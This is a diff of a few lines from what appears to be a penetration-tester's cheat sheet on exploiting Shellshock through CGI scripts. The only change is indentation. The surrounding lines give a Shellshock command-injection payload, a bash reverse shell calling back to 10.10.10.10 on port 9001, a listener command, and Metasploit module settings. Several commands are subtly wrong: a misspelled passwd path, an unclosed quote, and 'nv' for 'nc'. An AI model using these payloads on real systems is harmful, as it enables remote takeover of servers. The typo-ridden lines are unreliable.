@@ -183,7 +183,7 @@ that is a part of the local administrators group on the Windows target system
 	`() { :; }; echo; echo; /bin/bash -c 'cat /etc/password` -- to check if attack is possible
 	`() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'` and open `nv -nlvp 9001`
 - Using msfconsole
-	 use exploit/multi/http/apache_mod_cgi_bash_env_exec
+		 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 	 set RHOST
 	 set TARGETURI /cgipath.cgi
 	 exploit
